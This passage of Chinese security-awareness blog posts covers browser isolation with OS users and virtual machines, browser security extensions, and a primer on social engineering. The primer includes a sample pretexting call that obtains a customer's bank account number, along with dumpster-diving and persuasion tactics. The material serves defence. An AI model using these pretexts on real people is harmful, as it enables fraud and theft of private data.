两个用户。其中 A 是主用户，用来完成你日常的工作；B 是上网用户。那么你可以先登录“A用户”，然后在“A用户”的桌面上创建一个浏览器的快捷方式。（如何创建快捷方式，就不用俺手把手教了吧） 用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。 在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，就可以啦。 之后，如果你想在“A用户”的桌面上运行“B用户”的浏览器，只需点击该快捷方式，就会弹出如下对话框。然后输入“B用户”的用户名/口令，就能以“B用户”的身份运行浏览器。 刚才介绍的是图形界面的配置。对于习惯于命令行的 IT 专业人员，还可以用命令行的方式启动指定用户的某个进程。Linux 系统和 Mac OS 系统有 su 或 sudo 命令；Windows 系统有 runas 命令。 ◇优点1. 解决跨站脚本（XSS）的问题 这个优点跟前两种方案类似，俺就不再啰嗦了。 2. 解决高危插件（Flash）的使用问题 这个优点跟前两种方案类似，俺就不再啰嗦了。 3. 防范各种浏览器漏洞 正如刚才提到的——前两种方案（多浏览器、多实例）无法防御浏览器及插件的某些高危漏洞（具备本地执行攻击代码的漏洞）。而“多用户方案”可以大大降低这类漏洞的危害性。使得攻击代码只能威胁到“上网用户”本身，而不会威胁到其它操作系统用户。 ◇缺点1. 初始配置稍嫌麻烦 相比前面两种方案，这个方案的【初始配置】比较麻烦。而且你要分清楚哪个用户是用来干啥的。不过捏，一旦用久了，习惯了，也就不觉得麻烦了。 2. 无法防范极个别高明的攻击者 “多用户方案”之所以可以隔离攻击代码，是因为如今所有主流的桌面操作系统，都能够在操作系统层面，对不同的系统用户进行隔离。因为有操作系统层面的隔离，所以才限制了攻击代码的危害性。 但是，操作系统层面的隔离，也不是百分之百可靠滴。不要忘了，操作系统本身也是软件，也可能出现安全漏洞。在操作系统的安全漏洞中，有一类漏洞叫做“权限提升漏洞”（简称“提权漏洞”）。所谓的“提权漏洞”，顾名思义，就是能够提升【当前执行代码】的权限。比方说，本来攻击代码没有管理员权限，通过”提权漏洞”，就可以拿到管理员权限。 如果你的操作系统本身存在“提权漏洞”，同时你的浏览器或者插件存在“能够在本地执行代码的漏洞”，那么，高明的攻击者就有可能把这两者组合起来，对你的系统进行组合攻击。 不过大伙儿别担心——要实现这类组合攻击，需要同时掌握【未公开的】浏览器或插件漏洞，并且还要有【未公开的】操作系统提权漏洞（俺在前文里介绍过，“未公开漏洞”总是比“零日漏洞”更危险）。另外，攻击者还需要做很多准备工作，才能诱使你访问到恶意网页。一般的入侵者根本没有这个本事，也没有耐心去搞这些。反之，有这个本事又有这个耐心的入侵者，通常不会拿这种招数去入侵普通网友（这么做简直是大材小用）。所以，如果你只是一个普通的网友，在前面三个方案中挑选一个，即可。 估计有些好奇的同学会打听了。什么样的入侵者具有这种实力？什么样的人会成为他们的目标？ 由于本文的篇幅已经很长了，俺稍微调一下列位看官的胃口，在《Web相关的防范（下）》再来八卦这些，同时也介绍一下比“多用户方案”更高级的方案。虽然这种方案很多人用不到，但俺还是会写出来，就当满足一下大伙儿的好奇心 :-) 如何防止黑客入侵[7]：Web相关的防范（下）文章目录 ★【多虚拟机】的方案★使用浏览器的【安全扩展】★结尾 在前文，俺介绍了三种隔离浏览器的方式（多种浏览器、同种浏览器多实例、多操作系统用户）。今天继续介绍第四种隔离方式——虚拟机，然后再推荐一些浏览器的安全扩展。 ★【多虚拟机】的方案◇什么是“虚拟机”？ 本文提到的“虚拟机”，全称是“操作系统虚拟机”。 最近10年来，硬件水平显著提升，操作系统虚拟化的技术开始普及，出现了若干针对操作系统的虚拟化软件。这种软件可以让你在一台电脑上，同时运行【多个操作系统】（是不是很有趣？）。通过虚拟化软件来运行的操作系统，称之为“虚拟操作系统”；与之对应，你原先的操作系统称之为：真实操作系统或宿主操作系统。 由于“虚拟操作系统”是虚拟出来滴，你可以在里面为所欲为，而【不会】对真实操作系统产生实质性的影响。比方说，你可以在虚拟系统中把硬盘格式化，但不会影响到你的真实系统。同样的，如果某个虚拟系统被病毒感染了，也不会影响真实系统和其它虚拟系统。 ◇什么是“多虚拟机”的方案？ 所谓“多虚拟机”的方案，就是在你的电脑上创建多个虚拟机，分别用来实现【不同安全级别】的上网行为。 举个例子： 你可以创建虚拟机A，只用来访问网银（不访问其它网站）；然后创建虚拟机B，用来进行其它上网行为。那么，即使你在虚拟机B受到攻击，对虚拟机A也完全没有影响。这样一来，就可以彻底保证网银的安全。 ◇为啥要用“多虚拟机”的方案？前一篇博文提到的三种隔离方案，“多用户”比前两种方案安全。这种方案是基于操作系统提供的用户壁垒——包括：不同用户的进程隔离性、文件系统的访问控制（ACL）、等等。 但是“多用户”方案还是有缺陷的。如果攻击者同时利用了未公开的浏览器漏洞和未公开的操作系统【提权】漏洞，就有可能攻破操作系统的用户壁垒。不过大伙儿别担心，实现这种攻击的难度比较大，只有足够牛B的入侵者能够做到这点。 为了满足列位看官的好奇心，稍微介绍一下所谓的牛逼黑客，大都是哪些人。 御用骇客/御用高手 所谓的“御用高手/御用骇客”，也就是官方资助的入侵者（类似于武侠小说中的大内高手）。这种类型的入侵者，往往不是一个人单干独斗，而是一个团队群殴。 “御用高手”的目标大致有如下： 1. 军事目标军事目标主要有：外国重要的政府机构（比如：五角大楼）、外国重要的军工企业（比如：洛克希德-马丁公司）俺在前文提到了 RSA 被入侵的案例：攻击者首先利用零日漏洞入侵某个 RSA 公司的雇员，经过深度渗透之后，入侵者搞到了 RSA 动态令牌产品（SecureID）的种子（种子是用来生成动态口令的）。由于 SecureID 产品被许多大公司采用，所以入侵者可以利用偷来的种子算出动态口令，进而实现对美国多家大型军工企业的入侵。计划得如此严密的系列入侵，通常只有御用黑客团队能够干得出来。 2. 经济目标所谓的经济目标，主要都是国外知名的大公司。通过入侵这些公司，可以窃取商业机密，从而获得巨大的经济效益。 3. 政治目标政治目标就比较杂，比如：知名的反共网站、某些知名的政治异议人士的电脑/手机/邮箱/IM、等等。 举个例子： 2009年底，Google 被来自中国大陆的攻击者深度渗透（这就是传说中的“极光行动”）。此事直接导致 Google 愤而退出中国市场。根据事后分析，入侵者的注意力集中在某些 Gmail 邮箱的内容。而这些 Gmail 邮箱恰恰属于中国的持不同政见者。由此可见，入侵 Google 的人很可能是朝廷的走狗。 民间高手 除了御用黑客，也不排除民间有高手。甚至不排除某个御用黑客在业余时间干点脏活。 和御用高手不同，民间高手的目标相对比较单一，大部分人是为了获取经济利益。 综上所述，能被这2类人盯上的，往往是高价值目标。如果你只是一个普通网民，不用担心被高手盯上（也就是说，“多用户”的方案基本上可以满足你的安全需求）；反之，如果你自认为是一个高价值的目标，或者你对安全的要求非常非常高，不妨尝试一下“多虚拟机”的方案。 ◇如何操作？ 刚才已经说了“多虚拟机”的原理，还举了例子。 如果你已熟悉“虚拟化软件”（比如：VMware 系列、VirtualBox、等）的使用，那么本方案对你来说其实很简单——无非就是安装若干个虚拟操作系统，然后在虚拟系统中安装软件，仅此而已。 由于本文的重点是防范黑客入侵，所以俺就不再介绍虚拟化软件本身的安装和配置。关于虚拟化软件的扫盲（包括原理、安装、配置、使用），俺已经另写了一个系列（在“这里”）。 ◇优点 在4种浏览器隔离方案中，多虚拟机的安全性最高。即使你的某个虚拟机被病毒感染或者被植入木马，也几乎不会影响到你的其它虚拟机和真实系统。 当然，绝对的安全是不存在滴。虚拟化软件也是软件，只要是软件，就有可能出现漏洞，只要出现漏洞，就有可能被利用。但是，想通过虚拟化软件的漏洞来突破虚拟机的壁垒，难度更大（远远大于突破操作系统的用户壁垒）。这方面的技术细节，说来话长，俺就不展开了。 ◇缺点 对硬件的要求高（主要是物理内存和 CPU）。 具体要多高的硬件配置，取决于你同时开几个虚拟机。同时运行的虚拟机越多，就需要越大的物理内存和越多的CPU核心。 ★使用浏览器的【安全扩展】 终于把浏览器的话题说完了。接下来再介绍几款安全方面的浏览器扩展。这些扩展可以帮你提高 Web 的安全性。 ◇NoScript——同时支持 Firefox ＆ Chrome简介 NoScript 是一个名气很大、功能很强的 Firefox 扩展，主页在“这里”。通过它，你可以定制网站白名单。只有当你浏览白名单内的网站时，才启用浏览器的 JavaScript 脚本功能和插件功能（比如 Flash 插件、Java 插件、PDF 插件、等）。 白名单只是它的功能之一，更多的功能介绍，请看它的主页。 局限性 这个扩展可以有效地避免【陌生网站】上的挂马。但是，如果你【经常访问】的网站出现跨站脚本的漏洞，NoScript 有可能帮不了你。 在前面的博文中，俺曾经举了一个跨站脚本攻击的例子。比如说，你经常上某个 BBS，并且该 BBS 的界面功能依赖于 JavaScript。那么，你就必须把这个 BBS 站点加入到 NoScript 的白名单中。假如这个 BBS 本身出现了基于 JS 的跨站脚本漏洞，那你还是有可能中招 :( ◇NotScripts 与 ScriptNo——专用于 Chrome简介 某些用 Chrome 的同学，如果不喜欢刚才提到的 NoScript，可以考虑 Chrome 上的另外两款扩展——跟 NoScript 很像（不但功能很像，连名称也很像）。 一款叫做 NotScripts，主页在“这里”；另一款叫 ScriptNo，主页在“这里”。 NotScripts 的用户数比 ScriptNo 略多。至于要选哪个，请大伙儿自行判断。 局限性 这两款扩展的局限性类似于前一个小节提到的 NoScript，俺就不再啰嗦了。 ◇HTTPS Everywhere 这是著名的电子前线组织（EFF）发布的扩展，主页在“这里”，同时支持 Firefox 和 Chrome。说到 EFF，顺便提一下：Tor ＆ TorBrowser 也是该组织发布的产品。 如今，有很多网站都同时提供明文的 HTTP 协议和加密的 HTTPS 协议（比如维基百科）。装了 HTTPS Everywhere 扩展之后，如果你浏览的网站支持 HTTPS 协议，该扩展就会强制浏览器通过 HTTPS 协议访问该网站。从技术上讲，就是把所有针对该网站的 HTTP 请求都转换为 HTTPS 请求。 为啥要强制用 HTTPS 协议捏？因为 HTTPS 是加密协议，可以保护你免受入侵者的嗅探（关于“嗅探”的案例，前面的博文提到过）。 除了上述功能，HTTPS Everywhere 扩展还可以帮你侦测有问题的 CA 证书，降低“中间人攻击”（MITM）的风险。 局限性 如果某个网站只有 HTTP 连接，不提供 HTTPS 连接，那 HTTPS Everywhere 也帮不了你。 ◇LastPass简介 LastPass 名气最大的在线口令管理工具。官网在“这里”，维基百科的介绍在“这里”。 该工具提供了针对所有主流浏览器的扩展（包括IE、Firefox、Chrome、Opera、Safari、等），帮你自动填写网站的登录口令，免除你记忆诸多口令的麻烦。你本人只需要记住一个【主密码】，LastPass 会利用主密码来加密本地的密码数据库——你的其它口令都存在在该数据库中。 为了确保安全性，LastPass 进行在线同步时，传输的是加密后的数据库。因此，即使 LastPass 网站被黑，入侵者拿到的也只是加密后的用户口令数据库。同样的，如果有人偷了你的电脑，但不知道你的主密码，也无法打开你的密码数据库。 局限性 LastPass 的做法相当于把鸡蛋都放在一个篮子里，有好处也有坏处。 最大的风险在于主密码被盗。一旦主密码被盗，密码数据库中的所有密码就都暴露了。什么情况下会发生主密码被盗捏？比如你的电脑被植入木马，并且此木马具有键盘记录的功能；比如你输入主密码的时候，有人在旁边偷窥；…… 每个人都有很多密码。不过根据二八原理，真正重要的密码不到20%，大部分密码都不太重要。所以俺个人的建议是：少数特别重要的密码，还是靠自己脑子来记；大多数不太重要的密码，可以交给类似 LastPass 之类的口令管理软件。 ◇BetterPrivacy简介 BetterPrivacy 是一个侧重于隐私保护的 Firefox 扩展，主页在“这里”。 当你浏览某些网站的时候，网站可能会在你的电脑上记录 cookie。通过这些 cookie，网站可以追踪你的上网行为（比如你多久访问一次这个网站）。 有了 BetterPrivacy，你就可以配置允许哪些网站记录 cookie。BetterPrivacy 的牛B之处在于：它不光可以控制传统的 cookie，还可以控制 Flash 的 cookie（LSO）。 局限性 此扩展只针对隐私保护，无法防范扩展脚本等攻击。 浏览器的安全类扩展，细分为很多领域，数量也很多。限于篇幅，俺仅挑选出每个领域最出名的代表。如果你还有补充的，可以到本文留言。 ★结尾 关于 Web 的安全防范，本来只想写一篇。谁曾想，东扯西扯，居然写了三篇。可能有同学会问，为啥没提到杀毒软件和个人防火墙？俺觉得：把这两个话题放到 Web 安全防范中聊，不太合适——还是单独拿出来聊比较好。在本系列后续的博文，会说说杀毒软件和个人防火墙的那些事儿。","comments":true,"categories":[{"name":"经验分享","slug":"经验分享","permalink":"http://1905060202.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"博客","slug":"博客","permalink":"http://1905060202.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"programthink","slug":"programthink","permalink":"http://1905060202.github.io/tags/programthink/"},{"name":"小妙招","slug":"小妙招","permalink":"http://1905060202.github.io/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/"}]},{"title":"社会工程学","date":"2021-07-16T16:06:02.000Z","path":"2021/07/17/社会工程学/","text":"扫盲“社会工程学”[0]：基本常识文章目录 ★社会工程学是啥玩意儿？★为啥要了解社会工程学？★本系列帖子能给你啥帮助？★本系列帖子不能给你哪些帮助？ 最近几年，信息安全方面的问题日益严重，许多同学深受其害（比如网络钓鱼、盗用银行卡、蠕虫木马泛滥、僵尸网络盛行等等）。俺窃以为，很大一部分原因在于相应的扫盲教育没有跟上。且不说普通的电脑菜鸟对信息安全一无所知，即便是很多 IT 公司的专业技术人员，对此也知之甚少。其后果就是：很多菜鸟级的攻击手法屡试不爽，很多平庸的攻击者屡屡得手。有鉴于此，俺打算抽空普及一下信息安全相关的东东，或许能对某些同学有所帮助。 其实信息安全方面的话题非常之多，俺经过左思右想之后，决定先拿社会工程学来扫盲一下。至于为啥先说它，后面会解释原因。 ★社会工程学是啥玩意儿？ 俺喜欢把信息安全分为【硬安全】和【软安全】两部分。所谓“硬安全”主要包括具体的 IT 安全技术（比如：防火墙、入侵检测、漏洞扫描、拒绝服务攻击、缓冲区溢出攻击 ……）；而“软安全”主要涉及管理、心理学、文化、人际交往等方面，与具体的 IT 技术无关。今天所说的社会工程学，实际上就是“软安全”的范畴。 通俗地说，社会工程就是：攻击者利用【人】自身的弱点（往往是心理学层面）来获取信息、影响他人，从而达到自己不可告人的目的。光这么说稍显简单，更详细的定义可以参见“这里”。不懂洋文的同学可以看“这里”。 ★为啥要了解社会工程学？ 开头已经提到了安全基础知识的普及度不够。那为啥俺要先介绍社会工程学捏？主要有如下几点原因： ◇普及度不够 首先，社会工程是信息安全中一个经常被忽视的偏僻角落。即便很多 IT 安全领域的从业人员，往往也缺少社会工程学的相关常识。比如很多人都知道什么是防火墙、杀毒软件，但却从来没有听说过“社会工程学”这个词。 ◇重视不够 大部分的安全厂商都把注意力集中在“硬安全”方面（比如现在防火墙厂商、杀毒厂商多如牛毛），很少有安全厂商把社会工程挂在嘴边的。以此相反的是：现有的信息安全攻击，大都以“软安全”作为攻击者的突破口，只有一小部分是纯粹通过“硬安全”来进行的。（这又是一个二八原理的生动例子） 为啥攻击者喜欢从“软安全”层面进行突破捏？因为人性的弱点是很难在短时间内得到改善的（尤其是人多大公司、大机构，更是如此）。所以，“软安全”方面会遗留很多可以利用的漏洞，攻击者只要善于利用这些漏洞，就可以轻易侵入。 ◇用处大大滴 不过捏，光是鲜为人知、重视不足，还不至于让俺花这么多口水大力忽悠。还有另一个原因是：社会工程学的常识非常有用，而且它的用处不限于信息产业（几乎所有行业都用得着）。具体有些啥用处捏？ 首先，了解起码的社会工程学常识能够让你对相关的攻击手法（具体参见“这里”和“这里”）有基本的防范，不至于轻易上当。要知道，有很多人被攻击者利用了之后，自己还浑然不觉。 其次，如果你是公司的老板或者某个管理层的头头，你可以在自己的职权范围内进行相关的扫盲培训（后面的帖子会介绍如何防范）。 最后，假如你看完本系列后，发现自己在社会工程方面很有天赋，那或许可以考虑朝这个方向发展。比如搞个商业间谍之类的工作干干，没准也很有前途哦。不过捏，一旦将来被抓被关、被杀被剐，本博主是概不负责滴 :-) ★本系列帖子能给你啥帮助？ 如果你从来没有听说过社会工程学，仅仅想扫盲，那只需看本帖即可，后续的内容无需多看。 如果你希望对社会工程攻击能够有基本的防范，建议看看后续的“攻击手法”、“如何防范”。 如果你对社会工程学这门学问很有兴趣，建议看完本系列所有帖子。 如果你已经是社会工程学的老手，请不吝赐教，本系列帖子您老就不用看了。 ★本系列帖子不能给你哪些帮助？ 本系列帖子【不能】帮你成为社会工程学的高手。如果你真想达到这个目标，请先【确保】自己有这方面的天赋，接着再通过《欺骗的艺术》（凯文·米特尼克所著）进行深造。 本系列帖子【不能】帮你化解【所有的】社会工程攻击。毕竟社会工程学的手法太多、涉及的面太广。有些新颖的手法，其设计之巧妙、用心之险恶，估计连俺都会入套。 扫盲“社会工程学”[1]：攻击手法之【信息收集】文章目录 ★什么是信息收集？★收集的信息有啥用捏？★哪些信息属于不敏感信息？★如何收集到不敏感信息？ 上文普及了一些基本概念和常识，接下来就得说点实在的货色：介绍一下攻击者常用的套路。攻击者的套路大致可以分为如下几个步骤：信息收集、假冒身份、施加影响、实施最终的攻击。由于每个步骤介绍起来都蛮长的，俺今天先来介绍“信息收集”这个步骤。 ★什么是信息收集？ 信息收集就是通过各种手段去获取机构、组织、公司（以下统一简称“机构”）的一些【不敏感】信息。为啥特地强调“不敏感”捏？如果信息不敏感，就不会有特别严格的访问限制，攻击者也就容易得手。而且在获取这种信息的过程中，不易引起别人的注意，降低了攻击者自身的风险。 ★收集的信息有啥用捏？ 大部分社会工程攻击者都会从信息收集入手。但信息收集往往【不是】攻击者的最终目的，仅仅是攻击者进入下一个阶段的前期准备工作。大多数攻击者拿到这些信息之后，多半会用来包装自己，以便进行后续的身份假冒。具体如何该包装和冒充，俺会在下一个帖子里介绍。 ★哪些信息属于不敏感信息？ 典型的不敏感信息有如下几种： ◇某些关键人物的资料 这里说的“资料”包括该人物所处的部门、担任的职位、电子邮箱、手机号、座机分机号等。大伙儿注意一下，此处的【关键人物】，不一定是名气大或位高权重的人，而是指这些人位于攻击路线上的关键点。攻击者必须利用这些人来达到某种目的。 ◇机构内部某些操作流程的步骤 每个机构内部都有若干操作流程（比如报销流程、审批流程等），这些流程对于攻击者非常有用。一旦摸清了这些流程的细节，攻击者就能知道每一个攻击环节会涉及哪些对象，这些对象分别处于什么部门？担任什么职务？具有什么授权？ ◇机构内部的组织结构关系 机构的组织结构关系包括如下几个方面：各个部门的隶属关系、部门之间的业务往来、职权的划分、某个部门是强势还是弱势等等信息。 组织结构图的用处类似于操作流程，俺就不再多啰嗦了。 ◇机构内部常用的一些术语和行话 大部分攻击者都会收集一些机构内部的术语和行话。当攻击者在和机构内的其他人员交流时，如果能熟练地使用各种专用的术语和行话，就可以有效打消其他人的疑虑，并获得信任。 上述这些信息似乎蛮普通的，在大伙儿看来好像没啥价值。但是这些信息到了攻击者手中就能发挥出巨大的作用。 ★如何收集到不敏感信息？ 收集这些普通信息的途径大致有如下几种： ◇通过网站和搜索引擎 比如，很多机构的内部操作流程直接放在官方网站上，可以轻易获取。还有很多不敏感信息，攻击者通过 Google 就能找到一大把。 ◇通过离职员工 有些时候，某个员工（哪怕是一个很小的角色）跳槽到竞争对手那里，就可以带来很丰富的信息。保本的话，至少能拿到原公司的通讯录；稍好一些的话，还能拿到组织结构图以及更深层次的一些东东。 ◇通过垃圾分析 很多机构对于一些普通的打印材料，直接丢到垃圾桶，不会经过碎纸机处理。所以攻击者可以从办公垃圾中找到很多有用的信息。 举一个简单的例子：很多公司每当有新员工入职，人事或者行政人员都会打印一张清单给新员工。清单上面可能会有如下内容：公司内部常用服务器（比如打印服务器、文件服务器）的IP地址新员工外部邮箱的名称和默认口令公司内部系统（比如 ERP 系统、MIS 系统等）的用户名和默认口令某些内部系统的简单使用说明 如果某个新员工没有【立即】修改默认口令（有相当比例的新员工不会在入职当天立即修改【所有的】默认口令），并且把这个清单直接丢到垃圾桶。那对于垃圾分析者来说，可就捡了大便宜啦！ 不过捏，垃圾分析方法属于苦差事。使用此招数，每次都要捏着鼻子，在垃圾箱里翻上好几个小时。但还是有很多商业间谍乐此不疲。 ◇通过电话问讯 某些攻击者直接打电话给前台或者客户服务部，通过某些技巧，就能套出很多有价值的信息。 为啥攻击者特别偏爱于前台和客服人员捏？这里面可是大有讲究啊！一般来说，前台和客户服务人员都属于机构内的服务支撑部门。这些部门的员工经常被培训成具有如下特质：不怨其烦、热情好客、乐于助人。所以，这类员工会比较有耐心，也比较能满足攻击者的一些（哪怕是有点无理的）要求。 上述就是社会工程学中，信息收集的基本常识。本系列的下一个帖子，咱们来聊一下“假冒身份“的话题。 扫盲“社会工程学”[2]：攻击手法之【假冒身份】文章目录 ★为啥要假冒？★包装要达到啥效果？★如何包装？★一个实例 在前文，咱们介绍了“信息收集”，本文咱们来讲一讲“假冒身份”的手法。 为了避免某些同学误解，有必要事先澄清一下：“信息收集”、“假冒身份”、“施加影响”这三个手法不是孤立存在的，而是有机结合的。攻击者在干坏事的时候，总会混用这三个手法以达到最终目的。俺只是限于时间和篇幅，所以才大卸三块，分开来介绍。 ★为啥要假冒？ 假冒身份说白了就是“包装”。攻击者又不是傻冒，他们当然不会轻易暴露自己的真实身份，自然要找一个马甲来伪装一下。一般来说，攻击者会根据面对的目标来选取针对性的马甲。选好马甲之后，还要在某些细节上稍微粉饰一下，让人觉得更加逼真。 总而言之，包装要为后续的“施加影响”埋下伏笔，打好基础。 ★包装要达到啥效果？ 按照二八原理，大部分人都是感性的。包装的效果，就是要充分利用和挖掘人【感性的弱点】。 ◇博取信任 还记得上文提到的那些“不敏感信息”吗？攻击者会利用这些信息来证明自己是机构内的人，从而得到信任（具体看文本后面的实例）。博取信任是先决条件，只有先取得信任，攻击者才能再接再厉，继续博取好感、博取同情、树立权威等等。 ◇博取好感 博取好感显然是没啥坏处的。如果对方产生了好感，攻击者就便于提出更进一步的要求。比如很多保险推销员就善于利用各种手段来博取好感。 ◇博取同情 大部分人或多或少都有一点同情心，某些攻击者会刻意示弱，从而让对方产生一些同情心，然后借机提出一些要求。从这个角度来讲，很多乞丐也利用了社会工程学的技巧。 ◇树立权威性 很多人都会对权威人物有一种轻信和盲从。所以，树立权威性也有助于攻击者后续的“施加影响”。 ★如何包装？◇选择身份 要达到上述的效果，首先要选择特定的身份。选择身份是很有讲究的，要综合考虑多方面的因素。由于俺不是教你如何搞社会工程攻击，所以俺只能是简单说一说。 要博取好感，攻击者可以通过建立认同感来达到。比如对方是某个秘书，攻击者会谎称自己是另一个部门的秘书（职务上的认同）。关于认同感，后面的帖子会详细介绍。 要树立权威性，可以通过冒充公司内更高级别的人物（或者和高层相关的人，比如某领导的秘书）。这个招数对于那些等级森严的公司，效果挺好。 要博取同情的话，可以看本文后面举的例子。 ◇外貌的粉饰 除了选取身份，一些外貌的细节也很重要。由于大多数攻击者采用电话的方式沟通，那些嗓音略带磁性（仅限于男性）或者充满柔情（仅限于女性）的家伙，就很占优势啦。 大多数攻击者都不会贸然现身（现真身的风险可大了）。万一在特殊情况下需要亲自出马，到对方的机构去拜访，有经验的攻击者都会选取得体的着装，以便和假冒的身份相称。在这种情况下，攻击者的长相也是一个关键因素。那些相貌堂堂、一表人才、玉树临风的家伙，第一眼就会让对方产生好感并放松警惕。 顺便跑题一下。我在本系列开篇里面不是强调过天赋的重要性吗？所谓的社会工程学天赋，不光是脑瓜子机灵，嗓音和相貌也不能太差哦（尤其是嗓音）。俗话说得好：天生嗓音差不是你的错，但跑出来混社会工程就是你的不对啦！ ★一个实例 前面忽悠了一大堆理论，为了加深同学们的印象，咱来看个简单的例子（灵感来自凯文·米特尼克所著的《欺骗的艺术》）。在此例子中，攻击者的主要目的是更进一步的“信息收集”。在该过程中，攻击者使用了“假冒身份”的手法。 ◇主要人物介绍某社会工程攻击者，简称小黑。某公司客服人员，简称小白。 ◇背景介绍小黑想打探这家公司某客户（张三）的银行帐号。小黑先进行了一些初步的信息收集（通过Google），了解到如下信息：1、公司内部有一个商业客户资料系统，里面包含有客户的银行帐号2、该系统简称BCIS3、该公司的客户服务人员有BCIS的查询权限准备妥当之后，小黑打电话到该公司客户服务部。 ◇对话过程小白：你好，哪位？小黑：我是客户资料部的，我的电脑中了该死的病毒，没法启动了。偏偏有个总裁办的秘书让我查一个客户的资料，还催得很急。听说你们客服部也能登录到BCIS，麻烦你帮我查一下吧。谢谢啦！小白：哦。你要查什么资料？小黑：我需要一个客户的银行帐号。小白：这个客户的ID是多少？小黑：客户ID在我电脑里，可是我的电脑打不开了。麻烦你根据姓名进行模糊查找，应该能找到的。这个客户叫“张三”。小白：稍等，我查询一下。……小白：找到了，你拿笔记一下，他的银行帐号是1415926535。小黑：好的，我记下了。你可帮了我大忙啦！太谢谢你了！小白：不客气。 ◇案例分析 首先，攻击者通过信息收集中打听到“商业客户资料系统”简称BCIS。另外，攻击者还了解到“客服部门”有BCIS的查询权限。当小黑很自然地说出这两个信息，就会让小白相信自己是公司内的人员。 接着，小黑通过谎称自己的电脑中毒，来进行示弱并博取小白的同情。 有了上面这两条，小黑成功的把握就很大啦。如果再辅助一些特定的嗓音和语调，并且在言谈中流露出焦急的心情，那基本上就大功告成了。 关于“假冒身份”的话题，就暂时聊到这。本系列的下一个帖子，咱们来聊一下“施加影响”的话题。 扫盲“社会工程学”[3]：攻击手法之【施加影响】文章目录 ★关于《影响力》★博取好感★通过互惠原理来骗取好处★通过社会认同来施加影响★通过权威来施加压力★总结 上文咱们介绍了社会工程中包装的技巧。按照本系列的计划，本文要讨论的内容是：“如何施加影响”。 ★关于《影响力》 说到施加影响以及相关的技巧，就不得不提及《影响力》这本书。这真是一本好书啊！ 《影响力》这本书高屋建瓴地总结了“对他人施加影响”的种种伎俩。这些伎俩似乎不够光明正大，但常常能收到奇效。如果你从来没有读过此书，强烈建议你先去拜读一下，再接着来看本帖后续的内容。……………… 现在，不妨假设你已经拜读过《影响力》。接着，咱们来看看书上的那些技巧是如何运用在社会工程学当中的。 ★博取好感 博取好感是施加影响的手法中，最基本的招数。具体的技巧有很多种，咱今天只介绍常见的几种。 ◇通过外在特征的“光环效应” 此处所说的外在特征，包括相貌、嗓音、着装、甚至姓名等诸多方面；此处所说的“光环效应”（也叫光晕效应、晕轮效应），是指对某人的某个局部特征的看法被扩大化，变成对此人整体的看法。这么说比较抽象，咱来看下面几个例子。另外，俺单独写了一个帖子详细介绍“光环效应”，在“这里”。 举例1（以貌取人）据说当年马云创业时，出去推销产品，别人一看到他都觉得他是坏人。显然，相貌和人品没有必然联系。但是很多人在潜意识里，都会把长得歪瓜裂枣的人当成坏人。举例2（以名取人）比如很多歌星、影星仅仅由于演技好，其 fans 就把演技扩大化，认为他们/她们样样都好。其实演技好和人品好没有必然联系。所以俺在前文里强调社会工程的攻击者需要有好的嗓音（有时甚至需要有好的相貌），就是为了能发挥光环效应。 ◇通过相似性来博取好感 所谓的“相似性”，范畴很广，常见的有如下一些：同学、同乡、同校（校友）、爱好相同（比如都喜欢看球，甚至都喜欢某个球星）、经历相同、等。很多攻击者善于通过看似不经意的闲聊，和被攻击者扯上某种关系，让被攻击者的好感油然而生。 ★通过互惠原理来骗取好处 俺在看了《影响力》之后，才意识到互惠原则的效果竟然如此巨大。真是不看不知道，一看吓一跳。具体的例子书上举了很多，俺这里主要总结互惠原则的两种运用招式。 ◇初级招式：“投桃报李”式 “投桃报李”式比较好理解，简单说就是给予对方一点小甜头，然后再索取点小回报。 为了形象点，举例说明： 比如有个攻击者在信息收集阶段，想了解某个连锁商店店长的信息。攻击者打电话给该商店（接电话的是某店员），谎称自己是一位长期客户，由于该店的服务很好，想写封表扬信给店长。店员一听就很爽，立马就把店长的详细信息告知对方。 ◇高级招式：“拒绝-退让”式 “拒绝-退让”式比“投桃报李”式要高级一些。这个招式实际上包含了互惠原理和对比原理，如果把握得当，效果比“投桃报李”要好很多。具体的实施分两个步骤进行：先提出一个很高（比较过分）的要求（以下简称 A），对方多半会拒绝；然后，攻击者主动作出让步（撤回该要求），再提一个（相对 A 来说）比较低的要求（以下简称 B），这时对方多半会答应。其实 A 仅仅是一个烟雾弹，并不是攻击者的真实意图。攻击者真正想达成的是 B。 这个招式的难点在于把握A的尺度。A必须和B形成比较明显的反差（利用对比原理），通过A来衬托出B的微不足道。这样，对方拒绝了A之后，潜意识里觉得B反正很微不足道，再加上互惠原理的作用，就会很容易地接受B。 比如有些攻击者在收集信息时，可以先索取某个比较敏感的信息，如果对方拒绝了，就转而索取一个不敏感的信息。 ★通过社会认同来施加影响 所谓的“社会认同”，通俗地说就是人云亦云、随大流。大多数人都有这个毛病，否则也不会有那么多跟风、赶时髦的家伙了。 那社会工程者如何运用这个伎俩捏？一个常见的方法就是“造势”。通过制造某种舆论来引导（或者叫“误导”）被攻击者，从而达到目的。这种方式有两个要点： 首先，要达成某种规模效应。一旦规模形成，由于“社会认同”的影响，就会变成正反馈，导致越来越多的人被卷入。 其次，要注意引导的技巧。具体要如何“引导”捏？常见的有：“制造狂热”、“制造恐慌”、“制造愤怒”、“制造反感”等方式。当人们处于狂热、恐慌、愤怒、反感等状态时，会变得情绪化。这时候，感性的因素就会占主导，同时会丧失理性的判断，从而被一小撮人所利用。 从本质上分析，这两个要点依然是借助了心理学层面的因素来起作用。关于造势的例子，大伙儿可以看看源自 IT 行业的 FUD（Fear, Uncertainty, Doubt，具体解释见“这里”）手法。 写到这里，突然联想到：其实天朝的毛太祖，就是造势、造舆论的高手啊！上述的两个要点发挥得炉火纯青，不得不令人佩服啊！ ★通过权威来施加压力 大部分人都有服从权威的倾向。因此攻击者可以通过树立或借助权威，让对方服从自己的一些不太合理的要求。 比如有的攻击者假冒成某 VP（Vice President）的秘书，声称该 VP 急需某某文件或资料，那么对方就会迫于压力而答应。这个招数在等级森严的组织机构，效果特别好。 ★总结 